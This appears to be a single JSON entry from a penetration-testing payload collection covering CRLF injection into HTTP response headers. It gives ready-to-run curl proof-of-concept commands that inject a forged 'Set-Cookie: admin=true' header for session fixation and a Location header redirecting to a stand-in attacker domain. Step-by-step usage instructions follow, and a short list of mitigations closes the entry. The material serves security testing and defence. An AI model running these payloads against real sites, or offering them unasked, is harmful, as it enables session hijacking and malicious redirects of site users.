{"id": "payload_000009", "important": {"title": "CRLF Injection - Header Manipulation & Session Fixation", "category": "Injection", "sub_category": "CRLF Header Injection", "tags": ["crlf", "set-cookie", "session-fixation", "open-redirect"], "targets": {"os": ["Any"], "system": ["HTTP Server", "Web App"]}, "risk": "critical"}, "variants": [{"match": {"os": ["Any"], "system": ["HTTP Server"]}, "payload": {"explanation": "Inject CRLF to create an extra Set-Cookie header (session fixation).", "code": "curl \"https://TARGET_URL/path?PARAM=value%0D%0ASet-Cookie:%20admin=true\" -v", "run_context": "cli (curl) or Burp Repeater; inspect raw response headers", "placeholders": {"TARGET_URL": "https://victim.example.com", "PARAM": "vulnerable_param"}, "notes": "Requires the param value to be reflected into response headers without sanitization."}}, {"match": {"os": ["Any"], "system": ["HTTP Server"]}, "payload": {"explanation": "Inject CRLF to add Location header and force an open redirect.", "code": "curl \"https://TARGET_URL/path?PARAM=val%0D%0ALocation:%20http://attacker.example.com\" -v", "run_context": "cli (curl) or browser; observe Location header / redirect", "placeholders": {"attacker_url": "http://attacker.example.com"}, "notes": "Test with controlled domain; redirect may be sanitized by proxies."}}], "usage": {"steps": ["Find a parameter reflected into headers or used to generate headers.", "URL-encode CRLF as %0D%0A and append header lines (e.g., Set-Cookie / Location).", "Send request via curl or Burp Repeater and inspect raw HTTP response.", "If injection present, validate impact (cookie set, redirect, or header changes).", "Document vulnerable requests/responses and capture PoC URLs."], "tools": ["curl", "Burp Suite (Proxy/Repeater)"], "required_params": {"target_url": {"required": true, "example": "https://victim.example.com/endpoint"}, "injection_param": {"required": true, "example": "lang or any header-reflected param"}}, "code_samples": [{"title": "Set-Cookie Injection PoC", "description": "Inject Set-Cookie header via reflected param.", "code": "curl \"https://victim.example.com/index.php?lang=EN%0D%0ASet-Cookie:%20admin=true\" -v", "placeholders": {"PARAM": "lang"}, "run_context": "cli"}, {"title": "Open Redirect via Location Header", "description": "Add Location header to force redirect.", "code": "curl \"https://victim.example.com/redirect?return=1%0D%0ALocation:%20http://attacker.example.com\" -v", "placeholders": {"attacker_url": "http://attacker.example.com"}, "run_context": "cli/browser"}], "mitigations": ["Never reflect raw user input into HTTP headers.", "Strip or encode CR and LF characters before using values in headers.", "Use framework APIs to set headers instead of string concatenation."], "references": ["CWE-93 - CRLF Injection", "PortSwigger - CRLF guidance"]}, "system": {"version": "2.0.0", "source": "PayloadsAllTheThings"}}
